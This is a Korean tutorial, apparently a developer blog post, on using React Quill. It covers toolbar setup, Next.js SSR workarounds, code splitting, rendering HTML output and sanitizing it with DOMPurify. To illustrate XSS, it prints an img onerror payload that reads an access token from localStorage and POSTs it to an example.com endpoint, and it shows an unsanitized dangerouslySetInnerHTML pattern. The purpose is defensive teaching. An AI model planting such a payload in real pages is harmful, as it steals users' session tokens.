<h2 id="react-quill">React-Quill</h2>
<p><strong>React Quill</strong>은 <strong>Quill</strong>이라는 오픈 소스 리치 텍스트 에디터의 React 래퍼로, 사용자 친화적이고 강력한 웹 에디터를 <code>React 환경</code>에서 쉽게 구현할 수 있도록 도와주는 라이브러리다. <strong>Quill 자체</strong>는 다양한 스타일링과 서식 설정을 지원하며, <strong>React Quill</strong>을 통해 이를 React 컴포넌트처럼 활용할 수 있다.</p>
<blockquote>
</blockquote>
<p><strong>React Quill 주요 특징</strong></p>
<blockquote>
</blockquote>
<ol>
<li><strong>간편한 설치와 기본 기능 제공</strong> : 기본적인 텍스트 서식, 이미지 삽입, 링크 추가 등의 기능을 쉽게 구현할 수 있다.</li>
<li><strong>모듈화된 툴바 설정</strong>: <strong>Quill</strong>의 툴바는 모듈화되어 있어, 필요한 기능만 선택하거나 새로운 기능을 추가해 커스터마이징할 수 있다.</li>
<li><strong>풍부한 확장</strong>: <strong>Quill</strong>은 플러그인 구조로 설계되어 있어, 별도의 기능을 추가하기 쉽다. <strong>React Quill</strong>로도 이 구조를 활용해 확장성을 유지할 수 있다.</li>
<li><strong>지원되는 포맷 다양</strong>: <strong>Quill</strong>은 HTML, Markdown, JSON 등 다양한 포맷을 지원하여 데이터를 쉽게 변환하고 저장할 수 있다.</li>
</ol>
<h3 id="quick-start">Quick Start</h3>
<p><a href="https://www.npmjs.com/package/react-quill">NPM React-Quill</a></p>
<pre><code class="language-bash">npm install react-quill --save</code></pre>
<pre><code class="language-jsx">import React, { useState } from 'react';
import ReactQuill from 'react-quill';
import 'react-quill/dist/quill.snow.css';

function MyComponent() {
  const [value, setValue] = useState('');

  return &lt;ReactQuill theme=&quot;snow&quot; value={value} onChange={setValue} /&gt;;
}</code></pre>
<h3 id="툴바와-포맷-설정">툴바와 포맷 설정</h3>
<p><strong>React Quill</strong>에서는 Quill의 툴바와 포맷을 사용자가 원하는 대로 설정할 수 있다. 이 설정을 통해 에디터에 표시될 버튼과 스타일 옵션을 제어할 수 있다.</p>
<pre><code class="language-javascript">const modules = {
  toolbar: [
    [{ 'header': '1'}, {'header': '2'}, { 'font': [] }],
    [{ 'list': 'ordered'}, { 'list': 'bullet' }],
    ['bold', 'italic', 'underline', 'strike'],
    [{ 'color': [] }, { 'background': [] }],
    ['link', 'image'],
    ['clean']
  ],
};

const formats = [
  'header', 'font', 'size',
  'bold', 'italic', 'underline', 'strike', 'blockquote',
  'list', 'bullet', 'indent',
  'link', 'image', 'color', 'background'
];</code></pre>
<h3 id="이미지-업로드-기능-추가">이미지 업로드 기능 추가</h3>
<p><strong>Quill</strong>은 기본적으로 이미지 URL 삽입 기능을 제공하지만, 로컬에서 업로드한 이미지를 서버에 저장하고 이를 에디터에 표시하려면 별도의 이미지 핸들러를 추가해야 한다.</p>
<pre><code class="language-javascript">const handleImageUpload = () =&gt; {
  // 사용자 정의 업로드 로직
};

modules.toolbar[1].push({ handler: handleImageUpload });</code></pre>
<h3 id="클라이언트-사이드-렌더링과-서버-사이드-렌더링-문제">클라이언트 사이드 렌더링과 서버 사이드 렌더링 문제</h3>
<p><strong>React Quill</strong>은 브라우저 환경에서 작동하기 때문에 <code>document나 window</code>와 같은 브라우저 객체가 필요한데, 이로 인해 <strong>Next.js와 같은 SSR 환경</strong>에서 <code>document is not defined 오류</code>가 발생할 수 있다. 이를 해결하기 위해 <code>동적 import</code> 기능을 사용하여 서버 렌더링을 방지한다.</p>
<pre><code class="language-javascript">import dynamic from 'next/dynamic';

const TextEditor = dynamic(() =&gt; import('react-quill'), { ssr: false });

export default function MyEditor() {
  return &lt;TextEditor /&gt;;
}</code></pre>
<h3 id="code-splitting">Code-Splitting</h3>
<p><strong>Code Splitting(코드 분할)</strong>은 웹 애플리케이션을 여러 개의 번들로 나누어, 사용자가 필요한 시점에 필요한 코드만 로드하도록 하는 <strong>최적화 기법</strong>이다. 이를 통해 초기 로딩 속도를 개선하고, 사용자 경험을 향상시킬 수 있다.</p>
<h4 id="code-splitting의-필요성">Code Splitting의 필요성</h4>
<p>대규모 웹 애플리케이션은 종종 여러 페이지와 기능을 포함하므로, <strong>코드가 많아질수록 초기 로딩 시간이 길어진다.</strong> 모든 코드를 한 번에 번들링하여 제공하면 페이지 로드 속도가 느려지고 사용자 경험이 떨어지게 된다. <strong>Code Splitting</strong>을 통해 페이지 초기 로딩 속도는 빨라지고, 필요한 부분만 동적으로 로딩할 수 있게 된다.</p>
<h4 id="code-splitting-예시">Code Splitting 예시</h4>
<pre><code class="language-javascript">const onSubmitForm = async () =&gt; {
  const { Modal } = await import('antd')
  Modal.success({ content: '게시글 등록에 성공하였습니다!!!' })
}</code></pre>
<p><strong>submit</strong>을 하고 성공적으로 데이터가 <strong>backend</strong>로 들어가면 이 때 ! modal을 띄우려고 하는데,  이 때, <code>const { Modal } = await import('antd')</code> 를 불러와서 modal을 import 하는 것이다. 이는 초기 번들 크기를 줄이고, 애플리케이션이 더 빠르게 <strong>load</strong>될 수 있다.</p>
<h3 id="quill-데이터-형식">Quill 데이터 형식</h3>
<h4 id="html-형식-기본">HTML 형식 기본</h4>
<p><strong>React Quill</strong>의 <code>onChange 이벤트</code>를 통해 얻는 값은 <strong>HTML 문자열 형식</strong>이다. 이 값에는 텍스트, 서식, 이미지, 링크 등 다양한 HTML 태그가 포함되어 있다.</p>
<p>예를 들어, 사용자가 <strong>Quill을 통해 굵은 텍스트와 링크</strong>를 입력했다면, HTML 형식은 다음과 같이 들어올 수 있다.</p>
<pre><code class="language-html">&lt;p&gt;&lt;strong&gt;Bold Text&lt;/strong&gt; and &lt;a href=&quot;https://example.com&quot;&gt;Example Link&lt;/a&gt;&lt;/p&gt;</code></pre>
<p>그럼 실제 백엔드로 넘어가는 데이터는 <strong>HTML</strong>형식으로 넘어가게 될 것이고, 이후에 client에서는 해당 데이터를 사용할 때, <strong>HTML</strong> 형식으로 사용하게 될 것이다.</p>
<h4 id="dangerouslysetinnerhtml">dangerouslySetInnerHTML</h4>
<p><strong>React</strong>에서는 기본적으로 <strong>HTML</strong>을 그대로 <code>렌더링</code>하지 않는다. <strong>HTML</strong>이 문자열 형태로 제공되더라도 <strong>React</strong>는 이를 <code>단순 텍스트</code>로 처리하여 태그를 렌더링하지 않기 때문에, 외부에서 제공된 <strong>HTML</strong>을 렌더링해야 할 때는 <strong><code>dangerouslySetInnerHTML</code></strong>을 사용해야 한다.</p>
<pre><code class="language-jsx">const QuillOutput = ({ content }) =&gt; {
  return (
    &lt;div dangerouslySetInnerHTML={{ __html: content }} /&gt;
  );
};
</code></pre>
<p>하지만 <strong><code>dangerouslySetInnerHTML</code></strong>은 문제점이 존재한다.<code>HTML 문자열</code>을 그대로 삽입할 경우, 사용자가 악의적인 스크립트를 삽입할 가능성이 있기 때문에 <strong><code>XSS(크로스 사이트 스크립팅) 공격</code></strong>에 취약해질 수 있다.</p>
<pre><code class="language-jsx">&lt;img src='#' onerror='
  const token = localStorage.getItem(&quot;accessToken&quot;); 
  fetch(&quot;http://example.com/token&quot;, { 
    method: &quot;POST&quot;,
    headers: { &quot;Content-Type&quot;: &quot;application/json&quot; },
    body: JSON.stringify({ token }) 
  });
' /&gt;</code></pre>
<p>이런식으로 코드를 작성하게 되면 <strong>localstorage</strong>에 존재하는 <strong>access token</strong>을 탈취할 수 있다. 즉, 다른 사이트의 취약점을 노려서 <strong>Javascript 와 HTML</strong>로 악의적 코드를 웹 브라우저에 심고 사용자 접속 시 그 악성 코드가 실행되도록 하는 것을 <strong><code>크로스 사이트 스크립트 (Cross Site Script / XSS)</code></strong> 라고 한다.</p>
<h2 id="xss-문제-해결하기">XSS 문제 해결하기</h2>
<h3 id="dompurify">Dompurify</h3>
<p><strong>DOMPurify</strong>는 HTML 콘텐츠의 보안을 위해 <strong>XSS(크로스 사이트 스크립팅)</strong> 공격을 방지하는 JavaScript 라이브러리다. 이 라이브러리는 <code>HTML 콘텐츠</code>를 깨끗하게 정화(클렌징) 해 주므로, 사용자가 입력한 <code>HTML</code>을 렌더링할 때 악성 스크립트나 의도치 않은 태그 삽입을 막아 안전하게 표시할 수 있다.</p>
<blockquote>
<h4 id="dompurify의-주요-기능">DOMPurify의 주요 기능</h4>
<p><strong>XSS 공격 방지</strong>: <strong>DOMPurify</strong>는 HTML을 분석하여 악의적인 스크립트나 의심스러운 태그를 제거합니다. 예를 들어 <code>&lt;script&gt; 태그나 이벤트 핸들러 (onerror, onclick 등)</code>를 통한 악성 스크립트 실행을 막는다.</p>
</blockquote>
<p><strong>정교한 필터링</strong>: 기본적으로 위험한 요소만 제거하지만, 필요에 따라 특정 태그나 속성을 허용하거나 차단할 수 있는 커스터마이징 기능을 제공한다.</p>
<blockquote>
</blockquote>
<p><strong>안정성</strong>: <strong>DOMPurify</strong>는 브라우저 호환성이 높고, <code>React, Vue, Angular</code>와 같은 프레임워크와 함께 사용하기에도 적합하다.</p>
<blockquote>
</blockquote>
<p><strong>빠른 성능</strong>: <strong>DOMPurify</strong>는 성능 최적화가 잘 되어 있어, 실시간 필터링이 필요한 경우에도 사용하기 좋다.</p>
<pre><code class="language-jsx">import DOMPurify from 'dompurify';

const SafeHtmlComponent = ({ htmlContent }) =&gt; {
  const cleanHtml = DOMPurify.sanitize(htmlContent);

  return &lt;div dangerouslySetInnerHTML={{ __html: cleanHtml }} /&gt;;
};</code></pre>
<p><strong>DOMPurify</strong>는 <code>sanitize</code>을 통해서 <code>&lt;script&gt; 태그나 이벤트 핸들러 (onerror, onclick 등)</code>를 통한 악성 스크립트 실행을 막는다. <strong>DOMPurify</strong>는 HTML 콘텐츠를 안전하게 정제해 주지만, 보안적 취약점이 있는 HTML을 아예 무조건적으로 안전하게 만드는 것은 아니다. 민감한 정보를 표시할 때는 사용자의 데이터 입력과 렌더링 방식에 더욱 주의가 필요하다.</p>
<h3 id="delta-형식">Delta 형식</h3>
<p><strong>Quill</strong>은 <strong>Delta</strong>라는 JSON 기반의 구조화된 데이터 형식을 제공한다. <strong>Delta</strong>는 문서의 변경 사항(삽입, 삭제, 서식 등)을 객체 배열로 표현해 보다 직관적이고 안전하게 데이터를 관리할 수 있도록 한다.</p>
<p><strong>Delta 형식</strong>으로 값을 가져오려면 <code>getContents() 메서드</code>를 사용하면 된다.</p>
<pre><code class="language-jsx">import React, { useState, useRef } from 'react';
import ReactQuill from 'react-quill';

const EditorComponent = () =&gt; {
  const [content, setContent] = useState('');
  const quillRef = useRef(null);

  const handleChange = (value) =&gt; {
    setContent(value); // HTML 형식으로 저장
  };

  const getDeltaContent = () =&gt; {
    const quillEditor = quillRef.current.getEditor();
    const delta = quillEditor.getContents();
    console.log(delta); // Delta 형식으로 출력
  };

  return (
    &lt;div&gt;
      &lt;ReactQuill ref={quillRef} value={content} onChange={handleChange} /&gt;
      &lt;button onClick={getDeltaContent}&gt;Get Delta Content&lt;/button&gt;
    &lt;/div&gt;
  );
};
</code></pre>
<p>실제 <strong>delta</strong>는 다음과 같이 출력된다.</p>
<pre><code class="language-json">{
  &quot;ops&quot;: [
    { &quot;insert&quot;: &quot;Bold Text&quot;, &quot;attributes&quot;: { &quot;bold&quot;: true } },
    { &quot;insert&quot;: &quot; and &quot; },
    { &quot;insert&quot;: &quot;Example Link&quot;, &quot;attributes&quot;: { &quot;link&quot;: &quot;https://example.com&quot; } },
    { &quot;insert&quot;: &quot;\n&quot; }
  ]
}
</code></pre>
<p>이 형식 그대로 데이터를 보내게 되면, <strong>BackEnd</strong>에서는 <strong>json 객체</strong> 그대로 데이터를 저장해주면 된다.</p>